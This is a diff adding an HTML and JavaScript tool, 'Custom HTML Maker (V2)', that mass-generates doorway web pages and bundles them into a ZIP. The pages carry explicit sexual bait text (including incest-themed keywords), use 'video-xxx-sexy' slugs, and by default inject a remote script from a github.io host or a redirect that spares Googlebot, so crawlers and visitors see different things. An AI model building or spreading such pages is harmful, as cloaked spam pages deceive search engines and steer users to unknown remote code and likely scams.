@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Custom HTML Maker</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      background: #f4f7f6;
+      color: #333;
+      padding: 20px 10px;
+      margin: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+    }
+    h1 {
+      font-size: 22px;
+      text-align: center;
+      color: #2c3e50;
+      margin-bottom: 20px;
+    }
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 15px;
+    }
+    .input-group label {
+      font-size: 14px;
+      font-weight: bold;
+      margin-bottom: 5px;
+      color: #34495e;
+    }
+    .input-group input, .input-group textarea, .input-group select {
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      padding: 10px;
+      font-size: 14px;
+      font-family: inherit;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .input-group input:focus, .input-group textarea:focus {
+      border-color: #3498db;
+      outline: none;
+    }
+    .help-text {
+      font-size: 12px;
+      color: #7f8c8d;
+      margin-top: 4px;
+    }
+    .btn {
+      background: #3498db;
+      color: #fff;
+      border: none;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s;
+    }
+    .btn:hover {
+      background: #2980b9;
+    }
+    .btn:disabled {
+      background: #95a5a6;
+    }
+    #logBox {
+      background: #2c3e50;
+      color: #ecf0f1;
+      padding: 10px;
+      border-radius: 6px;
+      margin-top: 15px;
+      font-family: monospace;
+      font-size: 12px;
+      max-height: 200px;
+      overflow-y: auto;
+      display: none;
+      white-space: pre-wrap;
+    }
+    .download-btn {
+      background: #27ae60;
+      margin-top: 15px;
+      display: none;
+    }
+    .download-btn:hover {
+      background: #2ecc71;
+    }
+  </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Custom HTML Maker (V2)</h1>
+
+    <div class="input-group">
+      <label>1. Titles (One per line)</label>
+      <textarea id="titlesArea" rows="4" placeholder="Example Title 1&#10;Example Title 2"></textarea>
+      <div class="help-text">We will generate one HTML file for each title.</div>
+    </div>
+
+    <div class="input-group">
+      <label>2. Keywords</label>
+      <input type="text" id="keywordsInput" placeholder="keyword1, keyword2, viral video">
+    </div>
+
+    <div class="input-group">
+      <label>3. Image URL</label>
+      <input type="url" id="imageInput" value="https://www.shutterstock.com/shutterstock/videos/3589102761/thumb/5.jpg" placeholder="https://...">
+    </div>
+
+    <div class="input-group">
+      <label>4. Meta Description (Optional)</label>
+      <textarea id="metaInput" rows="2" placeholder="Leave empty to use the default secret meta description"></textarea>
+      <div class="help-text">🔒 If left empty, a fixed default description will be used automatically.</div>
+    </div>
+
+    <div class="input-group">
+      <label>5. Redirect Link (Optional)</label>
+      <input type="url" id="linkInput" placeholder="Leave empty to use the secret default script">
+      <div class="help-text">🔒 If left empty, it automatically uses the default script.</div>
+    </div>
+
+    <div class="input-group">
+      <label>6. Category</label>
+      <input type="text" id="categoryInput" placeholder="Sports, Entertainment, etc.">
+    </div>
+
+    <div class="input-group">
+      <label>7. HTML Template</label>
+      <div id="templateStatus" style="padding:8px 12px;border-radius:6px;font-size:13px;margin-bottom:8px;background:#fff3cd;color:#856404;border:1px solid #ffc107;">⚠️ No template saved. Please upload your <b>video-templete-01.html</b> once.</div>
+      <input type="file" id="templateInput" accept=".html">
+      <div class="help-text">Upload <b>video-templete-01.html</b> once — it will be saved in your browser automatically. Next time you won't need to upload again! Upload a different file to change template.</div>
+      <button type="button" id="clearTemplateBtn" style="margin-top:6px;background:#e74c3c;color:#fff;border:none;padding:6px 12px;border-radius:5px;font-size:12px;cursor:pointer;display:none;">🗑️ Remove Saved Template</button>
+    </div>
+
+    <div class="input-group">
+      <label>8. Custom Prefix (Optional)</label>
+      <input type="text" id="prefixInput" placeholder="video-viral">
+      <div class="help-text">If left blank, a random unique slug will be generated for each title.</div>
+    </div>
+
+    <button class="btn" id="generateBtn">Generate HTML Files</button>
+    <a id="downloadLink" class="btn download-btn">Download ZIP Archive</a>
+
+    <div id="logBox"></div>
+  </div>
+
+  <script>
+    let templateContent = "";
+
+    // Load saved template from localStorage on page load
+    window.addEventListener('DOMContentLoaded', function() {
+      const saved = localStorage.getItem('htmlmaker_template');
+      const savedName = localStorage.getItem('htmlmaker_template_name') || 'video-templete-01.html';
+      if (saved) {
+        templateContent = saved;
+        updateTemplateStatus(savedName, true);
+      } else {
+        updateTemplateStatus(null, false);
+      }
+    });
+
+    function updateTemplateStatus(name, isSaved) {
+      const statusEl = document.getElementById('templateStatus');
+      const clearBtn = document.getElementById('clearTemplateBtn');
+      if (isSaved) {
+        statusEl.style.background = '#d4edda';
+        statusEl.style.color = '#155724';
+        statusEl.style.borderColor = '#28a745';
+        statusEl.innerHTML = '✅ Template saved in browser: <b>' + name + '</b>';
+        clearBtn.style.display = 'inline-block';
+      } else {
+        statusEl.style.background = '#fff3cd';
+        statusEl.style.color = '#856404';
+        statusEl.style.borderColor = '#ffc107';
+        statusEl.innerHTML = '⚠️ No template saved. Please upload your <b>video-templete-01.html</b> once.';
+        clearBtn.style.display = 'none';
+      }
+    }
+
+    // Read the template file, save to localStorage
+    document.getElementById('templateInput').addEventListener('change', function(e) {
+      const file = e.target.files[0];
+      if (file) {
+        const reader = new FileReader();
+        reader.onload = function(evt) {
+          templateContent = evt.target.result;
+          localStorage.setItem('htmlmaker_template', templateContent);
+          localStorage.setItem('htmlmaker_template_name', file.name);
+          updateTemplateStatus(file.name, true);
+          log('✅ Template saved in browser: ' + file.name + ' (you won\'t need to upload again!)');
+        };
+        reader.readAsText(file);
+      }
+    });
+
+    // Clear saved template
+    document.getElementById('clearTemplateBtn').addEventListener('click', function() {
+      localStorage.removeItem('htmlmaker_template');
+      localStorage.removeItem('htmlmaker_template_name');
+      templateContent = '';
+      updateTemplateStatus(null, false);
+      log('🗑️ Saved template removed.');
+    });
+
+    function log(msg) {
+      const box = document.getElementById('logBox');
+      box.style.display = 'block';
+      box.textContent += msg + "\n";
+      box.scrollTop = box.scrollHeight;
+    }
+
+    function clearLog() {
+      const box = document.getElementById('logBox');
+      box.textContent = '';
+      box.style.display = 'none';
+      document.getElementById('downloadLink').style.display = 'none';
+    }
+
+    function generateRandomString(length) {
+      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
+    }
+
+    function makeSlug(text) {
+      let slug = text.toLowerCase().replace(/[^a-z0-9\s-]/g, "");
+      let words = slug.split(" ").filter(w => !w.includes("video"));
+      slug = words.join("-").substring(0, 50).replace(/-$/, "");
+      if (!slug) slug = "video";
+      const uniqueStr = generateRandomString(9);
+      return `video-xxx-sexy-${slug}-${uniqueStr}`.replace(/--/g, "-");
+    }
+
+    function getFormattedDate(format) {
+      const d = new Date();
+      if (format === 'iso') {
+        return d.toISOString().split('T')[0]; // YYYY-MM-DD
+      } else {
+        const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+        return `${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()}`;
+      }
+    }
+
+    document.getElementById('generateBtn').addEventListener('click', async function() {
+      clearLog();
+      const titles = document.getElementById('titlesArea').value.split('\n').map(t => t.trim()).filter(t => t);
+      if (titles.length === 0) {
+        alert("Please enter at least one title.");
+        return;
+      }
+
+      const keywords = document.getElementById('keywordsInput').value.trim();
+      const imgUrl = document.getElementById('imageInput').value.trim() || "https://www.shutterstock.com/shutterstock/videos/3589102761/thumb/5.jpg";
+      const DEFAULT_META = "is here to release all her secret porno clips and just for your eyes only! Family Fucking Each other xxxcom xxx XXXXX XXXXXX Porno SEX XXXXXXXX XXX SEXhdFamily Fucking Each other xxxcom xxx XXXXX XXXXXX Porno SEX XXXXXXXX XXX SEX The glamorous tamil sex movie sexy viral bombshell makes her scenes in the most beautiful decors under many sunsets, xxx you don't want to miss!";
+      const meta = document.getElementById('metaInput').value.trim() || DEFAULT_META;
+      const targetUrl = document.getElementById('linkInput').value.trim() || "https://tvgolive.github.io/links/sp.js";
+      const category = document.getElementById('categoryInput').value.trim();
+      const prefix = document.getElementById('prefixInput').value.trim();
+
+      const dateIso = getFormattedDate('iso');
+      const dateLong = getFormattedDate('long');
+
+      const zip = new JSZip();
+      let count = 0;
+
+      for (let i = 0; i < titles.length; i++) {
+        const title = titles[i];
+        
+        let html_content = templateContent;
+
+        // Fallback to python logic template if no template selected
+        if (!html_content) {
+          let redirect_head = "";
+          if (targetUrl.toLowerCase().endsWith(".js")) {
+            redirect_head = `<script src="${targetUrl}"><\/script>`;
+          } else {
+            redirect_head = `<script>\nif (!navigator.userAgent.includes('Googlebot')) {\n    window.location.href = "${targetUrl}";\n}\n<\/script>`;
+          }
+          html_content = `<!DOCTYPE html>\n<html>\n<head>\n<meta charset="utf-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n${redirect_head}\n<title>${title}</title>\n</head>\n<body>\n<h1>${title}</h1>\n<img src="${imgUrl}" alt="${title}" style="max-width:100%;height:auto;"/>\n<p>${meta}</p>\n<p>Redirecting to <a href="${targetUrl}">${targetUrl}</a>...</p>\n</body>\n</html>`;
+        } else {
+          // Process Custom Template exactly like make-html-v2.py does
+          
+          // Script logic
+          if (targetUrl.toLowerCase().endsWith(".js")) {
+            const regex = /https:\/\/getvalid\.pro\/watch\/[a-zA-Z0-9_-]+\.js/g;
+            if (regex.test(html_content)) {
+              html_content = html_content.replace(regex, targetUrl);
+            } else if (html_content.includes("<head>")) {
+              html_content = html_content.replace("<head>", `<head>\n  <script src="${targetUrl}"><\/script>`);
+            } else {
+              html_content = `<script src="${targetUrl}"><\/script>\n` + html_content;
+            }
+          } else {
+            const redirectScript = `<script>\nif (!navigator.userAgent.includes('Googlebot')) {\n    window.location.href = "${targetUrl}";\n}\n<\/script>\n`;
+            const scriptRegex = /<script[^>]*src=["']https:\/\/getvalid\.pro\/watch\/[a-zA-Z0-9_-]+\.js["'][^>]*>\s*<\/script>/gi;
+            if (scriptRegex.test(html_content)) {
+              html_content = html_content.replace(scriptRegex, redirectScript);
+            } else {
+              html_content = redirectScript + html_content;
+            }
+          }
+
+          // Replacements
+          html_content = html_content.split("LINKSS").join(targetUrl);
+          html_content = html_content.split("Categoryss").join(category);
+          html_content = html_content.split("Category").join(category);
+          html_content = html_content.split("Datesss2").join(dateLong);
+          html_content = html_content.split("Datesss").join(dateIso);
+          html_content = html_content.split("Titlex").join(title);
+          html_content = html_content.split("Title").join(title);
+          html_content = html_content.split("keywordss").join(keywords);
+          html_content = html_content.split("keywords").join(keywords);
+          html_content = html_content.split("imageses").join(imgUrl);
+          html_content = html_content.split("images").join(imgUrl);
+          html_content = html_content.split("MetaDescription").join(meta);
+          // Hardcoded fallback replacements based on the user's fixed template
+          html_content = html_content.split("https://cdnb.artstation.com/p/assets/images/images/076/569/795/large/full-video-video-adik-kakak-viral-tiktok-baju-biru-full-7-menit-link-hd-30.jpg").join(imgUrl);
+          html_content = html_content.split("2026-09-23T23:59:59").join(dateIso);
+          html_content = html_content.split("2026-09-23").join(dateLong);
+        }
+
+        // Generate filename
+        let filename = "";
+        if (prefix) {
+           filename = `${prefix}-${i+1}.html`;
+        } else {
+           filename = `${makeSlug(title)}.html`;
+        }
+
+        zip.file(filename, html_content);
+        log(`Generated: ${filename}`);
+        count++;
+      }
+
+      log(`\nAll done! Compressing ${count} file(s) into ZIP...`);
+
+      zip.generateAsync({ type: "blob" }).then(function(content) {
+        const url = URL.createObjectURL(content);
+        const dlBtn = document.getElementById('downloadLink');
+        dlBtn.href = url;
+        dlBtn.download = `Generated-HTML-${dateIso}.zip`;
+        dlBtn.style.display = 'block';
+        dlBtn.style.textAlign = 'center';
+        dlBtn.style.textDecoration = 'none';
+        log("ZIP Ready for download!");
+      });
+    });
+  </script>
+</body>
+</html>
